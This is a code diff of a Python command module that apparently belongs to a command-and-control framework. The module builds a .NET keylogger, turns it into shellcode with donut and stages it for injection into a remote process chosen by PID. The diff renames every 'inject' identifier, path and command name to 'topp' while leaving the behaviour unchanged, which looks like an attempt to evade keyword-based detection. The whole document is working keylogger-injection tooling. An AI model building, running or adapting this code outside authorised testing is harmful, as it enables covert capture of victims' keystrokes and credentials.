@@ -12,9 +12,9 @@ import os
 import asyncio
 import donut
 
-KEYLOG_INJECT_PATH = "/srv/KeyLogInject.exe"
+KEYLOG_topp_PATH = "/srv/KeyLogtopp.exe"
 
-class KeylogInjectArguments(TaskArguments):
+class KeylogtoppArguments(TaskArguments):
 
     def __init__(self, command_line, **kwargs):
         super().__init__(command_line, **kwargs)
@@ -29,7 +29,7 @@ class KeylogInjectArguments(TaskArguments):
 
     async def parse_arguments(self):
         if len(self.command_line) == 0:
-            raise Exception("Invalid number of parameters passed.\n\tUsage: {}".format(KeylogInjectCommand.help_cmd))
+            raise Exception("Invalid number of parameters passed.\n\tUsage: {}".format(KeylogtoppCommand.help_cmd))
         if self.command_line[0] == "{":
             self.load_args_from_json_string(self.command_line)
         else:
@@ -37,31 +37,31 @@ class KeylogInjectArguments(TaskArguments):
         self.add_arg("pipe_name", str(uuid4()))
 
 
-class KeylogInjectCommand(CommandBase):
-    cmd = "keylog_inject"
+class KeylogtoppCommand(CommandBase):
+    cmd = "keylog_topp"
     needs_admin = False
-    help_cmd = "keylog_inject [pid]"
+    help_cmd = "keylog_topp [pid]"
     description = "Start a keylogger in a remote process."
     version = 2
     author = "@djhohnstein"
-    argument_class = KeylogInjectArguments
-    browser_script = BrowserScript(script_name="keylog_inject", author="@its_a_feature_", for_new_ui=True)
+    argument_class = KeylogtoppArguments
+    browser_script = BrowserScript(script_name="keylog_topp", author="@its_a_feature_", for_new_ui=True)
     attackmapping = ["T1056"]
-    supported_ui_features=["keylog_inject"]
+    supported_ui_features=["keylog_topp"]
 
-    async def build_keyloginject(self):
-        global KEYLOG_INJECT_PATH
+    async def build_keylogtopp(self):
+        global KEYLOG_topp_PATH
         agent_build_path = tempfile.TemporaryDirectory()            
-        outputPath = "{}/KeylogInject/bin/Release/KeylogInject.exe".format(agent_build_path.name)
+        outputPath = "{}/Keylogtopp/bin/Release/Keylogtopp.exe".format(agent_build_path.name)
             # shutil to copy payload files over
         copy_tree(str(self.agent_code_path), agent_build_path.name)
-        shell_cmd = "dotnet build -c release -p:DebugType=None -p:DebugSymbols=false -p:Platform=x64 {}/KeylogInject/KeylogInject.csproj -o {}/KeylogInject/bin/Release/".format(agent_build_path.name, agent_build_path.name)
+        shell_cmd = "dotnet build -c release -p:DebugType=None -p:DebugSymbols=false -p:Platform=x64 {}/Keylogtopp/Keylogtopp.csproj -o {}/Keylogtopp/bin/Release/".format(agent_build_path.name, agent_build_path.name)
         proc = await asyncio.create_subprocess_shell(shell_cmd, stdout=asyncio.subprocess.PIPE,
                                                          stderr=asyncio.subprocess.PIPE, cwd=agent_build_path.name)
         stdout, stderr = await proc.communicate()
         if not path.exists(outputPath):
-            raise Exception("Failed to build KeylogInject.exe:\n{}".format(stderr.decode() + "\n" + stdout.decode()))
-        shutil.copy(outputPath, KEYLOG_INJECT_PATH)
+            raise Exception("Failed to build Keylogtopp.exe:\n{}".format(stderr.decode() + "\n" + stdout.decode()))
+        shutil.copy(outputPath, KEYLOG_topp_PATH)
 
 
     async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
@@ -69,20 +69,20 @@ class KeylogInjectCommand(CommandBase):
             TaskID=taskData.Task.ID,
             Success=True,
         )
-        global KEYLOG_INJECT_PATH
-        if not path.exists(KEYLOG_INJECT_PATH):
+        global KEYLOG_topp_PATH
+        if not path.exists(KEYLOG_topp_PATH):
             await SendMythicRPCTaskUpdate(MythicRPCTaskUpdateMessage(
                 TaskID=taskData.Task.ID,
                 UpdateStatus=f"building topping stub"
             ))
-            await self.build_keyloginject()
+            await self.build_keylogtopp()
         await SendMythicRPCTaskUpdate(MythicRPCTaskUpdateMessage(
             TaskID=taskData.Task.ID,
             UpdateStatus=f"generating stub shellcode"
         ))
 
         donutPic = donut.create(
-            file=KEYLOG_INJECT_PATH, params=taskData.args.get_arg("pipe_name")
+            file=KEYLOG_topp_PATH, params=taskData.args.get_arg("pipe_name")
         )
         file_resp = await SendMythicRPCFileCreate(
             MythicRPCFileCreateMessage(
@@ -93,7 +93,7 @@ class KeylogInjectCommand(CommandBase):
             taskData.args.add_arg("loader_stub_id", file_resp.AgentFileId)
         else:
             raise Exception(
-                "Failed to register keylog_inject stub binary: " + file_resp.Error
+                "Failed to register keylog_topp stub binary: " + file_resp.Error
             )
         response.DisplayParams = "-PID {}".format(taskData.args.get_arg("pid"))
         return response
